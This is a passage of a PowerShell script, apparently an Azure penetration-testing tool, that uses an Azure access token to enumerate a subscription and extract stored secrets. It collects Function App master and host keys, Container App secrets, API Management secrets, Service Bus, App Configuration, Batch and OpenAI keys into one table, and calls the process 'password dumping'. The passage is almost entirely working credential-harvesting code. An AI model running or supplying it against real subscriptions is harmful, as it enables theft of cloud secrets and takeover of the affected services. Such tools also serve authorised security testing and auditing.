                    $servicePrincipalID = ((Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$_.ResourceGroup,'/providers/Microsoft.Web/sites/',$_.Name,'/Config/authsettingsV2/list?api-version=2018-11-01')) -UseBasicParsing -Headers @{ Authorization ="Bearer $mgmtToken"} -Verbose:$false ).content | ConvertFrom-Json).properties.identityProviders.azureActiveDirectory.registration.clientId

                    $TempTblCreds.Rows.Add("Function App Service Principal",$_.Name,$servicePrincipalID,$appSettings,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
                }

                # Request the Function Keys
                try{
                    $functKeys = $_ | Invoke-AzResourceAction -Action host/default/listkeys -Force -ErrorAction Stop
                    $TempTblCreds.Rows.Add("Function App Master Key",$_.Name,"master",$functKeys.masterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                
                    $keyMembers = ($functKeys.functionKeys | get-member | where MemberType -EQ "NoteProperty")
                
                    $keyMembers | ForEach-Object{
                        $TempTblCreds.Rows.Add("Function App Host Key",$functAppName,$_.Name,(($_.Definition) -replace "String ") -replace (-join($_.Name,"=")),"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                    }
                }
                catch{Write-Verbose "`t`tERROR - Getting Function keys from the $functAppName application failed"}
            }
        }
    }

    if ($ContainerApps -eq 'Y'){
        # Container Apps Section

        # Variable Set Up
        $AccessToken = Get-AzAccessToken
        if ($AccessToken.Token -is [System.Security.SecureString]) {
            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
            try {
                $CAmanagementToken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
            } finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
            }
        } else {
            $CAmanagementToken = $AccessToken.Token
        }
        $subID = (Get-AzContext).Subscription.Id

        # List Resource Groups
        $RGURL = "https://management.azure.com/subscriptions/$subID/resourceGroups?api-version=2022-01-01"
        $rgList = ((Invoke-WebRequest -UseBasicParsing -Uri $RGURL -Headers @{ Authorization ="Bearer $CAmanagementToken"} -Method GET -Verbose:$false).Content | ConvertFrom-Json).value

        Write-Verbose "Getting List of Azure Container Apps"

        # Foreach Resource Group, list Container Apps
        $rgList | ForEach-Object {

            # Get list of Container Apps
            $CAListURL = "https://management.azure.com/subscriptions/$subID/resourceGroups/$($_.name)/providers/Microsoft.App/containerApps/?api-version=2022-03-01"
            $CAList = ((Invoke-WebRequest -UseBasicParsing -Uri $CAListURL -Headers @{ Authorization ="Bearer $CAmanagementToken"} -Method GET -Verbose:$false).Content | ConvertFrom-Json).value

            if ($CAList -ne $null){                
                # For Each Container App, get the secrets
                $CAList | ForEach-Object{
                    $CAName = ($_.id).split("/")[-1]
                    Write-Verbose "`tGetting Container App Secrets from the $CAName application"
                    $secretsURL = "https://management.azure.com$($_.id)/listSecrets?api-version=2022-03-01"
                    $CASecrets = ((Invoke-WebRequest -UseBasicParsing -Uri $secretsURL -Headers @{ Authorization ="Bearer $CAmanagementToken"; 'Content-Type' = "application/json"} -Method POST -Verbose:$false).Content | ConvertFrom-Json).value

                    # Add the Secrets to the output table
                    $CASecrets | ForEach-Object{
                        $TempTblCreds.Rows.Add("Container App Secret",$CAName,$_.name,$_.value,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
                    }
                }
            }
        }
    }

    if ($APIManagement -eq 'Y'){
        # API Management Section

        Write-Verbose "Getting List of Azure API Management Services"
        $APIlist = Get-AzApiManagement

        $APIlist | ForEach-Object{
            $APIMname = $_.Name
            Write-Verbose "`tGetting API Named Value Secrets from the $APIMname Service"
            $apimContext = New-AzApiManagementContext -ResourceGroupName $_.ResourceGroupName -ServiceName $_.Name
            Get-AzApiManagementNamedValue -Context $apimContext | ForEach-Object{
                if($_.Secret -eq $true){
                    $secretName = $_.name
                    try{
                    # Get the secret value
                        $APIMsecret = Get-AzApiManagementNamedValueSecretValue -Context $apimContext -NamedValueId $_.NamedValueId -ErrorAction Stop
                    
                        Write-Verbose "`t`tGetting $($_.name) Secret"

                        # Add the Secrets to the output table
                        $TempTblCreds.Rows.Add("API Management Secret",$APIMname,$_.name,$APIMsecret.value,"N/A","N/A","N/A","N/A","Secret","N/A",$subName) | Out-Null
                    }
                    catch{Write-Verbose "`t`t$secretName Secret is a Key Vault Value, skipping..."}
                }
            }
        }
    }

    if ($ServiceBus -eq 'Y'){
    # Service Bus Namespace Section
    $nameSpaces = Get-AzServiceBusNamespace

    Write-Verbose "Getting List of Azure Service Bus Namespaces"

    $nameSpaces | ForEach-Object{
        $tempNamespace = $_
        $authRule = Get-AzServiceBusAuthorizationRule -ResourceGroupName $_.ResourceGroupName -Namespace $_.Name
        $authRule | ForEach-Object{
            Write-Verbose "`tGetting Keys for the $($_.Name) Authorization Rule"

            $SBkeys = Get-AzServiceBusKey -Namespace $tempNamespace.Name -Name $_.Name -ResourceGroupName $tempNamespace.ResourceGroupName
            
            # Add the Secrets to the output table
            $TempTblCreds.Rows.Add("Service Bus Namespace Key",$tempNamespace.Name,-join($SBkeys.KeyName," - Primary Key"),$SBkeys.PrimaryKey,$SBkeys.PrimaryConnectionString,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            $TempTblCreds.Rows.Add("Service Bus Namespace Key",$tempNamespace.Name,-join($SBkeys.KeyName," - Secondary Key"),$SBkeys.SecondaryKey,$SBkeys.SecondaryConnectionString,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
        }
    }

    # App Configuration Keys Section
    if ($AppConfiguration -eq 'Y'){
        Write-Verbose "Getting List of App Configuration Stores"
        $configStores = Get-AzAppConfigurationStore
        $configStores | ForEach-Object {
            $configRG = ($_.Id).Split('/')[4]
            $AppConfigKeys = Get-AzAppConfigurationStoreKey -Name $_.Name -ResourceGroupName $configRG
            $AppConfigName = $_.Name
            $AppConfigKeys | ForEach-Object{
                # Add the Secrets to the output table
                $TempTblCreds.Rows.Add("App Configuration Access Key",-join($AppConfigName,"-",$_.Name),"Connection String",$_.ConnectionString,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
        }
    }


    # Batch Account Access Keys Section
    if ($BatchAccounts -eq 'Y'){

        Write-Verbose "Getting List of Azure Batch Accounts"

        #Get list of Batch Accounts
        $batchAccountList = Get-AzBatchAccount

        $batchAccountList | ForEach-Object{
            # Get Account Keys
            Try{
            $batchKeys = Get-AzBatchAccountKeys -AccountName $_.AccountName
                # Add the Secrets to the output table
                $TempTblCreds.Rows.Add("Batch Access Key",$_.AccountName,"Primary",$batchKeys.PrimaryAccountKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Batch Access Key",$_.AccountName,"Secondary",$batchKeys.SecondaryAccountKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
            Catch{Write-Verbose "`tNo ListKeys Permissions on the $($_.AccountName) Batch Account"}
        }
    }

    # Cognitive Services (OpenAI) Keys Section
    if ($CognitiveServices -eq 'Y'){

        Write-Verbose "Getting List of Azure Open AI Resources"

        #Get list of Cognitive Services (OpenAI) Resources
        $cogSRVList = Get-AzCognitiveServicesAccount

        $cogSRVList | ForEach-Object{
            # Get Account Keys
            Try{
            $csKeys = Get-AzCognitiveServicesAccountKey -Name $_.AccountName -ResourceGroupName $_.ResourceGroupName
                # Add the Secrets to the output table
                $TempTblCreds.Rows.Add("Open AI Key",$_.AccountName,"Primary",$csKeys.Key1,$_.Endpoint,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("Open AI Key",$_.AccountName,"Secondary",$csKeys.Key2,$_.Endpoint,"N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
            Catch{Write-Verbose "`tNo ListKeys Permissions on the $($_.AccountName) Open AI Resource"}
        }
    }

    Write-Verbose "Password Dumping Activities Have Completed"

    # Output Creds
    Write-Output $TempTblCreds
}


